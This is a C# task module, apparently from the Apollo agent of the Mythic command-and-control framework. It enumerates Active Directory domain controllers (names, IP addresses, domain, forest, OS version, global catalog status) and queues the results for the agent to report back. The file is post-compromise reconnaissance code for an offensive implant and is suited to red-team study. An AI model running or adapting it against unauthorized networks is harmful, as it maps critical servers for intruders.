#define COMMAND_NAME_UPPER

#if DEBUG
#define NET_DCLIST
#endif

#if NET_DCLIST

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ST = System.Threading.Tasks;
using System.DirectoryServices.ActiveDirectory;
using System.Runtime.Serialization;
using System.Net;

namespace Tasks
{
    public class net_dclist : Tasking
    {
        [DataContract]
        internal struct NetDomainController
        {
            [DataMember(Name = "computer_name")]
            public string ComputerName;
            [DataMember(Name = "ip_address")]
            public string IPAddress;
            [DataMember(Name = "domain")]
            public string Domain;
            [DataMember(Name = "forest")]
            public string Forest;
            [DataMember(Name = "os_version")]
            public string OSVersion;
            [DataMember(Name = "global_catalog")]
            public bool IsGlobalCatalog;
        }
        public net_dclist(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }

        public override void Start()
        {
            TaskResponse resp;
            DirectoryContext ctx;
            DomainControllerCollection dcCollection;
            List<NetDomainController> results = new List<NetDomainController>();
            if (string.IsNullOrEmpty(_data.Parameters))
                ctx = new DirectoryContext(DirectoryContextType.Domain);
            else
                ctx = new DirectoryContext(DirectoryContextType.Domain, _data.Parameters.Trim());
            dcCollection = DomainController.FindAll(ctx);
            foreach (DomainController dc in dcCollection)
            {
                var result = new NetDomainController();
                result.ComputerName = dc.Name;
                result.Domain = dc.Domain.ToString();
                try
                {
                    var ips = Dns.GetHostAddresses(result.ComputerName);
                    string ipList = "";
                    for (int i = 0; i < ips.Length; i++)
                    {
                        if (i == ips.Length - 1)
                            ipList += $"{ips[i].ToString()}";
                        else
                            ipList += $"{ips[i].ToString()}, ";
                    }

                    result.IPAddress = ipList;
                }
                catch (Exception ex)
                {
                    result.IPAddress = dc.IPAddress;
                }

                result.Forest = dc.Forest.ToString();
                result.OSVersion = dc.OSVersion;
                result.IsGlobalCatalog = dc.IsGlobalCatalog();
                results.Add(result);
            }

            resp = CreateTaskResponse(
                _jsonSerializer.Serialize(results.ToArray()),
                true);
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif